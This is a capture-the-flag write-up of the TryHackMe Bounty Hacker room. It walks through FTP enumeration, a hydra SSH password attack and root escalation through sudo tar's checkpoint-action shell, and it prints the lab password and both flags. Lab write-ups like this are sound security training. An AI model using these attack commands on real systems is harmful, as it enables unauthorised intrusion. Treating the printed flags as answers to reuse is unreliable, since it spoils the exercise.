# Bounty Hacker – TryHackMe Writeup

## Overview

This report documents the compromise of the **Bounty Hacker** TryHackMe machine through a combination of service enumeration, anonymous FTP access, credential discovery, SSH authentication, and privilege escalation through misconfigured sudo permissions.

The objective was to identify exposed services, gain initial access to the target system, escalate privileges, and obtain both user and root flags.

---

# Target Information

| Field     | Value         |
| --------- | ------------- |
| Target IP | 10.48.184.127 |
| Platform  | TryHackMe     |
| Room Name | Bounty Hacker |

---

# Executive Summary

During the assessment, several weaknesses were identified that allowed an attacker to progress from anonymous access to full root compromise.

The attack chain involved:

1. Enumerating exposed network services.
2. Accessing an anonymous FTP share.
3. Retrieving sensitive files containing usernames and passwords.
4. Performing an SSH password attack.
5. Gaining access as user **lin**.
6. Enumerating sudo privileges.
7. Exploiting a misconfigured sudo rule for **tar**.
8. Escalating privileges to root.
9. Obtaining the root flag.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Credential Access
* Initial Access
* Privilege Escalation
* Credential Discovery

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.48.184.127
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 62
```

The TTL value suggested that the target was likely running a Linux-based operating system.

---

# Phase 2 – Network Enumeration

## Port Scanning

### Command

```bash
nmap 10.48.184.127
```

### Results

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

### Analysis

The scan revealed three primary attack surfaces:

* FTP service available
* SSH service available
* Web server running on port 80

Since FTP frequently contains exposed files or credentials, it became the primary enumeration target.

---

# Phase 3 – FTP Enumeration

## Anonymous Login

### Command

```bash
ftp 10.48.184.127
```

### Credentials

```text
Username: anonymous
```

### Result

Anonymous authentication was successful.

### Security Impact

Anonymous FTP access allows unauthenticated users to access shared resources and potentially retrieve sensitive information.

---

## File Enumeration

### Command

```bash
ls
```

### Result

```text
locks.txt
task.txt
```

---

## Downloading Files

### Commands

```bash
get locks.txt
get task.txt
```

### Result

Both files were successfully downloaded.

---

# Phase 4 – Information Disclosure

## Reviewing task.txt

### Command

```bash
cat task.txt
```

### Contents

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

### Finding

The note revealed a valid username:

```text
lin
```

---

## Reviewing locks.txt

### Command

```bash
cat locks.txt
```

### Contents

The file contained multiple password candidates.

### Analysis

The file appeared to be a password list associated with the discovered user account.

### Security Impact

Sensitive password data was exposed through anonymous FTP access.

---

# Phase 5 – Credential Access

## SSH Password Attack

Using the discovered username and password list, an SSH password attack was performed.

### Command

```bash
hydra \
-l lin \
-P locks.txt \
ssh://10.48.184.127
```

### Result

```text
login: lin
password: RedDr4gonSynd1cat3
```

### Security Impact

The password was recoverable through a targeted dictionary attack.

---

# Phase 6 – Initial Access

## SSH Login

### Credentials

```text
lin : RedDr4gonSynd1cat3
```

### Command

```bash
ssh lin@10.48.184.127
```

### Result

Access was successfully obtained as:

```text
lin
```

---

# Phase 7 – User Flag Discovery

## Locating the User Flag

### Command

```bash
ls ~/Desktop
```

### Result

```text
user.txt
```

---

## Reading the User Flag

### Command

```bash
cat ~/Desktop/user.txt
```

### Result

```text
THM{CR1M3_SyNd1C4T3}
```

---

# Phase 8 – Privilege Escalation Enumeration

## Checking Sudo Permissions

### Command

```bash
sudo -l
```

### Result

```text
(root) /bin/tar
```

### Analysis

The user was permitted to execute the tar binary as root.

According to GTFOBins, tar can be abused to execute arbitrary commands when run with elevated privileges.

### Security Impact

Misconfigured sudo permissions enabled a direct path to root compromise.

---

# Phase 9 – Privilege Escalation

## Exploiting tar

### Command

```bash
sudo tar cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

### Result

```text
#
```

### Verification

```bash
whoami
```

### Output

```text
root
```

### Analysis

The tar checkpoint functionality executed a root shell, resulting in complete privilege escalation.

---

# Phase 10 – Root Flag Discovery

## Accessing Root Directory

### Command

```bash
cd /root
ls
```

### Result

```text
root.txt
```

---

## Reading the Root Flag

### Command

```bash
cat root.txt
```

### Result

```text
THM{80UN7Y_h4cK3r}
```

---

# Attack Chain

```text
Anonymous FTP Access
        ↓
task.txt
        ↓
Username Discovered (lin)
        ↓
locks.txt
        ↓
Password List Obtained
        ↓
Hydra SSH Attack
        ↓
lin : RedDr4gonSynd1cat3
        ↓
SSH Access as lin
        ↓
sudo -l
        ↓
Tar Sudo Privilege
        ↓
GTFOBins Tar Exploit
        ↓
Root Shell
        ↓
Read root.txt
```

---

# Findings & Vulnerabilities

| ID   | Finding                                     | Severity |
| ---- | ------------------------------------------- | -------- |
| F-01 | Anonymous FTP Access Enabled                | Medium   |
| F-02 | Sensitive Files Exposed via FTP             | Medium   |
| F-03 | Password List Accessible to Anonymous Users | High     |
| F-04 | Weak Credential Security                    | High     |
| F-05 | Misconfigured Sudo Permission for tar       | Critical |

---

# Tools Used

### Enumeration

* Nmap
* FTP Client

### Credential Access

* Hydra

### Privilege Escalation

* GTFOBins
* Tar

### Remote Access

* SSH

---

# Flags Obtained

| Flag      | Value                |
| --------- | -------------------- |
| User Flag | THM{CR1M3_SyNd1C4T3} |
| Root Flag | THM{80UN7Y_h4cK3r}   |

---

# Conclusion

The compromise of the target system was achieved through a combination of anonymous file sharing, exposed credential information, weak authentication controls, and a dangerous sudo misconfiguration.

Anonymous FTP access allowed retrieval of sensitive files that disclosed both a valid username and a password list. These findings enabled successful SSH authentication as the user **lin**. Further enumeration revealed that the user could execute **tar** as root via sudo, which was abused to spawn a root shell and obtain full system compromise.

The assessment demonstrates how multiple seemingly minor weaknesses can be chained together to achieve complete administrative access to a system.
